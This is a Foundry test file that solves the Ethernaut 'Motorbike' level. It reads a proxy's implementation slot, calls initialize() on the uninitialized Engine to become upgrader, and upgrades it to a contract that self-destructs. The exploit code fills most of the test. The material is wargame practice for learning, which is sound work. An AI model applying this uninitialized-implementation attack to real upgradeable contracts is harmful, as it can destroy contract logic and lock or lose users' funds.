// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console2.sol";
import "../src/Ethernaut.sol";
import "../src/metrics/Statistics.sol";
import "openzeppelin-contracts/utils/Address.sol";

interface IEngine {
    function horsePower() external view returns (uint256);

    function initialize() external;

    function upgradeToAndCall(address newImplementation, bytes memory data)
        external
        payable;

    function upgrader() external view returns (address);
}

contract SelfDestructor {
    function selfDestruct() public {
        selfdestruct(payable(msg.sender));
    }
}

contract MotorbikeTest is Test {
    using stdStorage for StdStorage;

    Ethernaut ethernaut;
    Statistics statistics;
    address eoa = address(0x1337);

    function setUp() public {
        ethernaut = new Ethernaut();

        // Statistics is actually deployed as upgradeable proxy
        // Deploying and initializing it normally for simplicity
        statistics = new Statistics();
        statistics.initialize(address(ethernaut));

        // Set Statistics contract on Ethernaut
        ethernaut.setStatistics(address(statistics));
    }

    function testMotorbikeHack() public {
        /* Level Setup */
        // Deploy level factory: MotorbikeFactory
        bytes memory bytecode = vm.getCode(
            "MotorbikeFactory.sol:MotorbikeFactory"
        );

        address motorbikeFactoryAddress;
        assembly {
            motorbikeFactoryAddress := create(
                0,
                add(bytecode, 0x20),
                mload(bytecode)
            )
        }

        // Register level on Ethernaut
        ethernaut.registerLevel(Level(motorbikeFactoryAddress));

        // Set caller to custom address
        vm.startPrank(eoa);
        vm.deal(eoa, 1 ether);

        // Start recording logs to capture new level instance address
        vm.recordLogs();
        // Create new level instance via Ethernaut
        ethernaut.createLevelInstance{value: 0.001 ether}(
            Level(motorbikeFactoryAddress)
        );

        // Parse emitted logs
        Vm.Log[] memory entries = vm.getRecordedLogs();
        assertEq(
            entries[0].topics[0],
            keccak256("LevelInstanceCreatedLog(address,address,address)")
            // event LevelInstanceCreatedLog(address indexed player, address indexed instance, address indexed level);
        );
        Vm.Log memory levelMotorbikeCreatedLog = entries[0];

        // Cast bytes32 log arg into address
        address instanceAddress = address(
            uint160(uint256(levelMotorbikeCreatedLog.topics[2]))
        );
        emit log_named_address("instanceAddress", instanceAddress);

        /* Level Hack */
        // 0. Get Engine address
        bytes32 _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
        // Read implementation storage slot and convert 32 bytes result into address
        address engineAddress = address(
            uint160(uint256(vm.load(instanceAddress, _IMPLEMENTATION_SLOT)))
        );
        IEngine engine = IEngine(engineAddress);

        // 1. Call initialize directly on Engine
        address upgrader = engine.upgrader();
        emit log_named_address("upgrader", upgrader);
        assertEq(upgrader, address(0));

        engine.initialize();

        upgrader = engine.upgrader();
        emit log_named_address("upgrader", upgrader);
        assertEq(upgrader, address(eoa));

        // 2. Deploy a contract with selfdestruct()
        SelfDestructor selfDestructor = new SelfDestructor();

        // 3. Call upgradeToAndCall() directly on Engine to set to above contract and also call selfdestruct()
        engine.upgradeToAndCall(
            address(selfDestructor),
            abi.encodeWithSignature("selfDestruct()")
        );

        // selfdestruct() has no effect in Foundry tests
        // Since its all a big single txn, and the effects of selfdestruct only happens at the end of the txn
        // Hence manually etching the code to empty
        vm.etch(engineAddress, "");

        bool destroyed = !Address.isContract(engineAddress);
        console.log("destroyed", destroyed);
        assertTrue(destroyed);

        /* Level Submit */
        // Start recording logs to capture level completed log
        vm.recordLogs();
        ethernaut.submitLevelInstance(payable(instanceAddress));

        // Parse emitted logs
        Vm.Log[] memory submitLogsEntries = vm.getRecordedLogs();
        assertEq(
            submitLogsEntries[1].topics[0],
            keccak256("LevelCompletedLog(address,address,address)")
            // event LevelCompletedLog(address indexed player, address indexed instance, address indexed level);
        );
        Vm.Log memory levelCompletedLog = submitLogsEntries[1];

        // Cast bytes32 log arg into address
        address playerAddress_ = address(
            uint160(uint256(levelCompletedLog.topics[1]))
        );
        emit log_named_address("playerAddress_", playerAddress_);

        address instanceAddress_ = address(
            uint160(uint256(levelCompletedLog.topics[2]))
        );
        emit log_named_address("instanceAddress_", instanceAddress_);

        assertEq(playerAddress_, eoa);
        assertEq(instanceAddress_, instanceAddress);

        vm.stopPrank();
    }
}
